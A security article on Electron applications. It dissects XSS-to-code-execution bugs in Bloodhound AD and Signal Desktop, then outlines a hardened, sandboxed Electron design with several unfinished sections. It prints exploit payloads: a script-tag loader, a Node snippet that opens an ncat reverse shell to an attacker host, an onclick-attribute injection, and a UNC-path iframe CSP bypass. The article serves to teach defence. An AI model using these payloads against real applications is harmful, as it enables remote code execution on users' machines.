# Reasonably Secure Electron

Author: Joe DeMesy

### Table of Contents

- [Reasonably Secure Electron](#reasonably-secure-electron)
    - [Table of Contents](#table-of-contents)
  - [Preface](#preface)
  - [Part 1 - Out of the Browser Into the Fire](#part-1---out-of-the-browser-into-the-fire)
    - [Bloodhound AD](#bloodhound-ad)
      - [`HelpModal.jsx`](#helpmodaljsx)
      - [`HelpModal.jsx`](#helpmodaljsx-1)
      - [`HelpModal.jsx`](#helpmodaljsx-2)
      - [`HelpModal.jsx`](#helpmodaljsx-3)
      - [`nodeTooltip.html`](#nodetooltiphtml)
    - [Signal Desktop](#signal-desktop)
      - [`Quote.tsx`](#quotetsx)
      - [Background.html](#backgroundhtml)
    - [What's in a Name?](#whats-in-a-name)
    - [String Manipulation vs. Lexical Parsing](#string-manipulation-vs-lexical-parsing)
    - [Future Standards](#future-standards)
  - [Part 2 - Reasonably Secure](#part-2---reasonably-secure)
    - [Engineering for Failure](#engineering-for-failure)
    - [Outline](#outline)
    - [Origin Security](#origin-security)
      - [`app-protocol.ts`](#app-protocolts)
    - [Sandboxed](#sandboxed)
      - [[`main.ts`]()](#maints)
      - [[`preload.js`]()](#preloadjs)
  - [We're All Doomed](#were-all-doomed)

## Preface

_"In the face of ambiguity, refuse the temptation to guess."_ -The Zen of Python

[Electron](https://electronjs.org/) is a cross-platform framework for developing desktop applications using "web" technologies like HTML, JavaScript, and CSS. Electron has become very popular in recent years for its ease of use, empowering developers to quickly develope generally good looking, responsive, cross-platform desktop applications. Applications major tech companies like Microsoft Teams, VSCode, Slack, Atom, Spotify, and even secure messaging apps like Signal all use Electron or similar "native web" application frameworks. Electron did not start this trend, embedded webviews have been around for sometime. For example, iMessage is developed using embedded WebKit webviews, which have been [available on MacOS and iOS](https://developer.apple.com/documentation/webkit/wkwebview) for years. Similarly, [JavaFX](https://docs.oracle.com/javase/8/javafx/embedded-browser-tutorial/overview.htm) supports embedable WebKit and [Windows has IE objects](https://msdn.microsoft.com/en-us/windows/desktop/aa752084) that can be embedded in 3rd party applications.

Electron applications unlike the others often garner a fervent hatred, "Electron wastes resources!" yell the commenters Hacker News. "300Mb or RAM for 'Hello World'" jeers the Java Swing programmer, I only use 100Mb! Then the QT/C++ programmer quips "I only use 40Mb," as the C/ncurses programmer scoffs at the C++ programmer, and X86 assembly demoscene programmer laments the inefficiencies of modern languages. Finally the ARM assembly program remarks upon the wastefulness of X86 CPU microcode. --The truth is of course Electron optimizes developement time, not computational resources. It remaines a viable and pragmatic choice for those who value developement time more than their user's RAM. 

Electron is also often regarded as inherently "insecure." While this reputation is also not entirely undeserved, application security is far more dependent upon engineering practices rather than the underlying framework. That is not to say the frameworks you choose have no bearing on security; it is possible to write secure PHP code, but [due to the language's often unintuative design it's not easy](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/) (and yes I'm aware a lot of this was fixed in PHP v7, but it's fun to beat a dead horse). Similarly, it's possible to write secure Electron applications, though we may need to keep an eye out for a variety of pitfalls as we'll explore.

## Part 1 - Out of the Browser Into the Fire

Since Electron applications are built on web application technologies, unsurprisingly they're often vulnerable to the same flaws found in your everyday web applciation. Whereas in the past web applications flaws have generally been confined to the browser's sandbox, no such limitations exist (by default) in Electron. This change has led to a significant increase in the impact a Cross-site Scripting (XSS) bug can have, since the attacker will gain access to the NodeJS APIs. Back in 2016 [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I release some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrating remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on MacOS, and created a cross-platform self-propegating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).

But what is the root cause of XSS and why is it so hard to prevent? There's a common misconception that the proper fix for a cross-site scripting is sanitizing user input. The notation that sanitizing user input can concretely fix an XSS issue is __untrue__, the only proper fix for XSS is _contextual output encoding_. That said, it's still a good idea to sanitize user input so do that too (and be sure you're sanatize using a whitelist, not a blacklist) --but you need to ensure it's done _in addition to proper output encoding_. A good rule of thumb is: "sanitize input, encode output," but what does contextual encoding entail? Let's explore the details of a couple recent exploits to better understand how XSS manifests and how to prevent it.

### Bloodhound AD

We'll first look at a couple vulnerabilities I found in the Bloodhound AD tool, one of which was independently discovered by [Fab](https://github.com/BloodHoundAD/BloodHound/issues/267).

Bloodhound is an incredibly powerful tool for analyzing the structure of Windows Active Directory deployments, and finding ways to exploit the various privilege relationships therein. The attacker (or defender) runs a ingestor script the dumps data from Active Directory into JSON, the JSON is the parsed into a Neo4j database and an Electron GUI can be used to query and view the results in a nice graph view. A quick look at the code reveals the application is primarily based on [React](https://reactjs.org/). React generally speaking, and for reasons we'll discuss later, is very good at preventing cross-site scripting attacks, but edge cases do exist. Such an edge case is the use of the `dangerouslySetInnerHTML()` function. This function is similar in functionality to a DOM element's `innerHTML()` function (also dangerous); the function takes in a string and parses it as HTML. 

Using canidate point analysis, a quick search of the unpatched [Bloodhound AD](https://github.com/BloodHoundAD/BloodHound/tree/a7ea5363870d925bc31d3a441a361f38b0aadd0b) codebase and we find four instances of this function being used, excerpt below:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L1988)
```jsx
<Modal.Body>
  <Tabs
    defaultActiveKey={1}
    id='help-tab-container'
    justified
  >
  <Tab
    eventKey={1}
    title='Info'
    dangerouslySetInnerHTML={this.state.infoTabContent}
  />
```

In the excerpt above we can see an attribute of this `this.state` object is passed to our canidate point `dangerouslySetInnerHTML`, from this sink we'll trace backwords to determine if the issue is exploitable, and looking at the definition of `this.state` we can see that it's a basic JavaScript object initialized with empty strings, including the `.infoTabContent` attribute, which is passed as a parameter to our sink:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L5)
```javascript
export default class HelpModal extends Component {
  constructor() {
    super();
    this.state = {
      open: false,
      infoTabContent: '',
      abuseTabContent: '',
      opsecTabContent: '',
      referencesTabContent: '',
    };
```

So next we must determine how `.infoTabContent` is set, jumping to the next usage of `infoTabContent` we find:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L239)
```javascript
  this.setState({ infoTabContent: { __html: formatted } });
```

Here we see the empty string `infoTabContent` is replaced with a JavaScript object with the key `__html`, this aligns with [React's documentation](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml) of how `dangerouslySetInnerHTML` works and is a good indication we've correctly traced the code and this value is indeed passed to our sink. The `__html` key's value is the `formatted` variable. So from here we must determine what the variable is, and what it contains. Scrolling up a bit we can see that `formatted` is just a string, which is built using string interpolation with variables `${sourceName}` and `${targetName}`:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L228)
```javascript
} else if (edge.label === 'SQLAdmin'){
  formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.

  There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.

  For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
  
  Author: Scott Sutherland`;
}
```

Based on my usage and understanding of the tool, and as the help dialog helpfully points out, these values are based on data collected by the ingestor script from Active Directory i.e. from an 'untrusted' source, and therefor "attacker" controlled (note the ironic inversion of 'attacker' in this context). This confirms the exploitability of our canidate point, attacker controlled content is indeed passed to `dangerouslySetInnerHTML`. All an attacker needs to do is plant malicous values, such as a GPO as Fab demonstrated, with the following name:

```html
aaaaaa<SCRIPT SRC="http://example.com/poc.js">
```

Where `poc.js` contains:

```javascript
const { spawn } = require('child_process');
spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
```

Since the GPO name is not properly encoded it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.

A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound, but otherwise had limited access to AD the exploit could go in the traditional direction too.

The most comprehensive fix for this vulnerability would be to re-write the functionality such that `dangerouslySetInnerHTML` is not needed, however from a practical perspective a lot of code would need to be refactored. A short term and effective fix is to HTML encode the attacker controlled variables. By HTML encoding these values, we can ensure these strings are never interpreted by the browser as actual HTML, and can support arbitrary characters. The prior payload: `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` will be encoded as `aaaaaa&lt;SCRIPT SRC="http://example.com/poc.js"&gt;` and will be displayed as `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` but not interpreted as HTML. So is preventing cross-site scripting a simple matter of HTML encoding attacker controlled values? Unfortunately no.

In another area of the application the [Mustache](https://mustache.github.io/) template library is used to render tool tips. The Mustache library HTML encodes by default, another potential fix for the prior vulnerability would be to switch from string interpolation to Mustache templates. However, as we discussed the proper fix is _contextual encoding_, not blanket HTML encoding. HTML encoding will prevent XSS in an HTML context, but when used outside of an HTML context it will fail, or only coincidentally prevent XSS. 

Looking at the usage of Mustache in Bloodhound we see that a few values are passed to the tooltips, notably `label` is attacker controlled:

#### [`nodeTooltip.html`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/nodeTooltip.html)
```html
<div class="header">
  {{label}}
</div>
<ul class="tooltip-ul">
  {{#type_ou}}
  <li onclick="emitter.emit('setStart', '{{type}}:{{guid}}')">
    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
  </li>
  <li onclick="emitter.emit('setEnd', '{{type}}:{{guid}}')">
    <i class="fa fa-bullseye"> </i> Set as Ending Node
  </li>
  {{/type_ou}}
  {{^type_ou}}
  <li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
  </li>
```

In the first usage, `{{label}}` is not vulnerable, since this is an HTML context i.e. the string we are rendering is within an HTML tag:

```html
<div class="header">
    {{label}}
</div>
```

The second instance of `{{label}}` though is used as part of the HTML tag attribute `onclick=`:

```html
<li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
  <i class="fa fa-map-marker-alt"></i> Set as Starting Node
</li>
```

Note that `{{label}}` is rendered into the following JavaScript code snippet:

```javascript
emitter.emit('setStart', '{{type}}:{{label}}')
```

Now, it's important to understand that Mustache will HTML encode the `label` variable, and as you may have guessed our goal will be to insert an `'` character to terminate the JavaScript string parameter passed to `event.emitter`. For example, if we pass a `label` value of `a'); alert(1);//'` (note: we need to ensure our injection results in syntactically correct JavaScript) we'd ideally generate something along the lines of:

```javascript
emitter.emit('setStart', 'someType:a'); alert(1);//')
```

However, the studious reader will know that Mustache actually HTML encodes both `'` and `"`:

```text
Welcome to Node.js v12.9.1.
Type ".help" for more information.
> const mustache = require('mustache');
undefined
> mustache.render("{{a}}", {a: "'"});
'&#39;'
> mustache.render("{{a}}", {a: '"'});
'&quot;'
```

So when rendered by Mustache we will end up with something along the lines of:

```html
<li onclick="emitter.emit('setStart', 'a:a&#39;); alert(1);&#x2F;&#x2F;&#39;')">
```

So is this exploitable? Yeap, it actually is, due to [order in which a browser decodes and interprets values](https://html.spec.whatwg.org/multipage/parsing.html). Attributes are always decoded before they are interpreted as values, which means the browser will decode `&#39;` back into `'` for us prior to prasing the attribute as JavaScript. By the time the JavaScript interpreter parses the code it will be valid, and we can inject attacker controlled code. This is what we mean when we talk about _contextual entity encoding_. You must account for all of the context(s) -oftentimes multiple nested contexts- in which a value will be interpreted. Getting not just the encoding correct, but often the ordering the encodings correct, is a non-trivial problem. But fret not! We can usually avoid this problem altogether, but more on that later.

This also touches on why sanitizing user input can be a problematic fix for injection issues. It's rare that at the time of accepting user input we know exactly what context(s) the values will be used in later. For example, if we sanitized `label` for XSS by removing HTML control characters such as `<` and `>` we'd still be left with an exploitable XSS vulnerability. If we go further and remove `'`, `"`, `}`, and `)` are we certain there's not a third or even forth context where `label` is used that may be vulnerable? This leads us to why you should always use whitelist sanitization, not a blacklist. Whitelist santization routines will better account for unintended contexts and other side effects. Regardless, neither is ideal if these characters are valid in a GPO name and we reject GPO names that contain these characters or remove the characters from the name, we'll have a functionality issue in that we cannot properly display the name as intended. This is why proper contextual encoding must be used to meet both our functional and security requirements.

### Signal Desktop

In 2018 [Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor), and [Matt Bryant](https://twitter.com/IAmMandatory) found [multiple remote code execution flaws](https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/) in the [Signal](https://signal.org/) desktop application, a secure end-to-end encrypted messaging application.

Both variations of the exploit worked in a similar fashion, message content and quoted repsonses (shown below) were rendered using the `dangerouslySetInnerHTML()` function:

#### [`Quote.tsx`](https://github.com/signalapp/Signal-Desktop/blob/721935b0c82a52d919ab61dff7ddc63d6d6ebe92/ts/components/conversation/Quote.tsx#L114)
```tsx
export class Quote extends React.Component<Props, {}> {

  //...removed for brevity

  public renderText() {
    const { i18n, text, attachments } = this.props;

    if (text) {
      return (
        <div className="text" dangerouslySetInnerHTML={{ __html: text }} />
      );
    }
  }
```

This meant that message content and quoted messages that contained HTML tags would be rendered by Electron as HTML, the one complication with exploiting this flaw was that Electron had implement a fairly strong [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (CSP):

#### [Background.html](https://github.com/signalapp/Signal-Desktop/blob/721935b0c82a52d919ab61dff7ddc63d6d6ebe92/background.html#L9)
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'none';
          connect-src 'self' https: wss:;
          script-src 'self';
          style-src 'self' 'unsafe-inline';
          img-src 'self' blob: data:;
          font-src 'self';
          media-src 'self' blob:;
          child-src 'self';
          object-src 'none'"
>
```

In this case what _appears_ to be the primary hurdle the attacker must get over is the `script-src 'self'` line. This CSP policy blocks JavaScript, including inline JavaScript, unless it is loaded from the application's current origin. The browser's same origin policy (SOP) defines origins using protocol, host, and port. For example, `http://example.com` we'd have a protocol of `http:` host of `example.com` and an implicit port 80, which would be considered a distinct origin from `https://example.com` since the protocol nor the port (now an implicit 443) do not match. So if an application loaded from the `https://example.com` origin defines a CSP with a script directive of `script-src 'self'` only JavaScript loaded from `https://example.com` would be allowed to execute, anything else, including for example `http://example.com/foobar.js` would be blocked.

So what origin does an Electron application run in, since there's no HTTP server? Well since the application is loaded from the user's file system the origin of an Electron application will default to a file URI, as shown below:

```text
> window.location.origin
"file://"
```

This means that in the context of Signal Desktop's CSP that `'self'` equates to `file://`, and if you've read the details about our [2016 iMessage exploit](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) you'll know that `file://` origins have all sorts of special permissions such as using `XmlHttpRequest` to read files.

[Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor) very cleverly used this property to bypass Signal's CSP and load remote content. They didn't actually bypass `script-src 'self'` but instead leveraged `child-src 'self'`, which controls where `<iframe>` HTML tags can load content from. This directive is similarly set to `'self'`, which means that `<iframe>` tags must load content from the `file://` origin. Notably, child frames do _not_ inherit the parent frame's CSP policy even if they're loaded from the same origin as the parent, so if an attacker is able to load content into a child frame it is completely uncontrained by the CSP and can execute arbitrary JavaScript as well as access all of the NodeJS APIs since this is Electron after all. The next property abused to load remote content is the use of UNC paths on the Windows operating system, which as you may guess are considered to be part of the `file://` origin. Therefore, the final payload is:

```html
<iframe src=\\DESKTOP-XXXXX\Temp\rce.html>
```

This payload loads an HTML file into an iframe from a UNC path, which does not violate the application's CSP since it's from the `file://` origin. Once loaded the child frame can execute native code in the context of the application since there's no more `script-src` restrictions.

This exploit is an excellent example of the limitations of CSPs, a CSP _cannot_ prevent XSS; it can however complicate/limit the exploitation process, or make an otherwise exploitable bug unexploitable. CSP is a seatbelt, depending upon the severity of a crash it can and very well may save you, but it's not perfect. And it's not the 80's anymore, so wear your fucking seatbelt.

### What's in a Name?

A function by any other name could be so vulnerable. The flaws in both Signal and Bloodhound AD stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon.

All of the aforementioned bugs are at their core cross-site scripting vulnerabilities (XSS), which is a terrible name. Cross-site scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differenciate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting attacker-controlled data as instructions. This can be said about XSS, as well as SQL injection, command injection, etc. The core mechanics of all these vulnerabilities are actually the same, save for what the "computer" is.

The "computer" in a SQL injection is the SQL interpreter, and in the context of XSS it's the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally that in a prepared statement there is always a speratation of the query logic (instructions) from the data (parameters). Thus there is no ambiguity between instruction and data for an attacker to abuse:

```php
$stmt = $conn->prepare("INSERT INTO Users (firstname, lastname, email) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $firstname, $lastname, $email);
```

In the PHP prepared statemate above, the logic (i.e. the query) is first passed to the `prepare()` function, then the data (i.e. parameters) are subsequently passed in a seperate `bind_param()` function call. This prevents any possibility of the database misinterpreting user controlled data (e.g. `$firstname`) as SQL instructions. However, an application that exclusively makes use of prepared statements is not automatically "secure," though it may be free of this one particular vulnerability, care still must be taken when designing an application and a defence-in-depth approach is still warranted --SQL injection is not the only vulnerability that can result in an attacker stealing data from the database.

So is CSP the DOM analog to SQL prepared statements? Not really, CSP allows the programmer to add metadata to an HTTP response telling the browser how to distinguish _where_ instructions (i.e. `script-src`, etc) can be loaded from. CSP is very much like [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection) (buffer overflows are injection vulnerabilities where data on the stack is mistaken for instructions) it only makes distinctions on the _where_. Similar to DEP, CSP can bypassed by loading instructions from areas (i.e. origins) that are already "executable" --if we can find an initial injection point. Just as DEP does not make `strcpy()` safe to use in any context, nor does CSP make safe things like `dangerouslySetInnerHTML()` or `.innerHTML`. CSP and DEP only kick in _after_ the injection has occured, they're seatbelts. Our paramount concern is preventing the initial injection, in conjunction with the strongest possible CSP.

### String Manipulation vs. Lexical Parsing

So how do we construct a DOM whilst making a clear distinction between the instructions and data of our application?

[Angular compiler talk](https://youtu.be/bEYhD5zHPvo?t=18624)






### Future Standards

There are also future standards, such as "Trusted Types" proposed by Google to help make a better distinction between data and instructions when performing native browser DOM updates:

> [Trusted Types](https://developers.google.com/web/updates/2019/02/trusted-types) allow you to lock down the dangerous injection sinks - they stop being insecure by default, _and cannot be called with strings_."



## Part 2 - Reasonably Secure

### Engineering for Failure

Everything is hackable and it’s simply a matter of time and resources before someone gets in


### Outline

This is my attempt at making a _reasonably_ secure Electron application. High level design is:

* __Sandboxed__ - The main WebView does NOT have `nodeIntegration` enabled; the WebView cannot directly execute native code, access the file system, etc. it has to go thru the IPC interface to perform any actions a browser normally could not. The IPC interface is called via `window.postMessage()` with `contextIsolation` enabled so there are no direct references to Node objects within the sandbox.
* __No HTTP__ - The sandboxed code does not talk to the server over HTTP. Instead it uses IPC to talk to the native Node process, which then converts the call into RPC (Protobuf over mTLS). There are no locally running HTTP servers and thus no HTTP cross-origin conerns. However, [due to a bug in Electron](https://github.com/electron/electron/issues/19603) it's possible for plugin scripts to control URI parameters. So care must be take to ensure URI parameters cannot cause a state changing event.
* __CSP__ - Strong CSP by default: `default-src none`, no direct interaction with the DOM, Angular handles all content rendering.
* __Navigation__: Navigation and redirects are disabled in all windows.
* __App Origin__: No webviews run with a `file://` origin, nor an `http://` origin, etc. Webviews run in either a `null` origin (plugin scripts) or within an `app://foobar` origin. In combination with CSP, this means the main webview cannot access any `file:` or `http:` resources.


### Origin Security

We also want to avoid having the application execute within the `file:` origin, as we've discussed `file:` origins can be problematic and expose potential opertunities for attackers to bypass the CSP and load remote code. Futhermore, since `file:` URIs lack proper MIME types Electron will refuse to load ES6 modules from this origin. Therefore, we can both improve security and enable the use of modern ES6 modules at the same type by switching to a custom protocol.

This is done in Electron using `RegisterBufferProtocolRequest`, ironically all of the provided examples in the Electron documentation are vulnerable to path traversal, which would allow an attacker to read any file on the filesystem even if `nodeIntegration` is disabled. 

#### `app-protocol.ts`
```typescript
export function requestHandler(req: Electron.RegisterBufferProtocolRequest, next: ProtocolCallback) {
  const reqUrl = new URL(req.url);
  let reqPath = path.normalize(reqUrl.pathname);
  if (reqPath === '/') {
    reqPath = '/index.html';
  }
  const reqFilename = path.basename(reqPath);
  fs.readFile(path.join(DIST_PATH, reqPath), (err, data) => {
    const mimeType = mime(reqFilename);
    if (!err && mimeType !== null) {
      next({
        mimeType: mimeType,
        charset: charset(mimeType),
        data: data
      });
    } else {
      console.error(err);
      next({
        mimeType: null,
        charset: null,
        data: null
      });
    }
  });
}
```

### Sandboxed

From personal preference we'll use TypeScript, with a few execeptions where using TypeScript needlessly complicates the build process (e.g. `preload.js`).

#### [`main.ts`]()
```typescript
const mainWindow = new BrowserWindow({
  webPreferences: {
    sandbox: true,
    webSecurity: true,
    contextIsolation: true,
    webviewTag: false,
    enableRemoteModule: false,
    allowRunningInsecureContent: false,
    nodeIntegration: false,
    nodeIntegrationInWorker: false,
    nodeIntegrationInSubFrames: false,
    nativeWindowOpen: false,
    safeDialogs: true,
    preload: path.join(__dirname, 'preload.js'),
  },
});
```

The preload script is just a small snippted of JavaScript:

#### [`preload.js`]()
```javascript
const { ipcRenderer } = require('electron');

window.addEventListener('message', (event) => {
  try {
    const msg = JSON.parse(event.data);
    if (msg.type === 'request') {
      if (['client_'].some(prefix => msg.method.startsWith(prefix))) {
        ipcRenderer.send('ipc', msg);
      }
    }
  } catch (err) {
    console.error(err);
  }
});

ipcRenderer.on('ipc', (_, msg) => {
  try {
    if (msg.type === 'response' || msg.type === 'push') {
      window.postMessage(JSON.stringify(msg), '*');
    }
  } catch (err) {
    console.error(err);
  }
});
```


## We're All Doomed

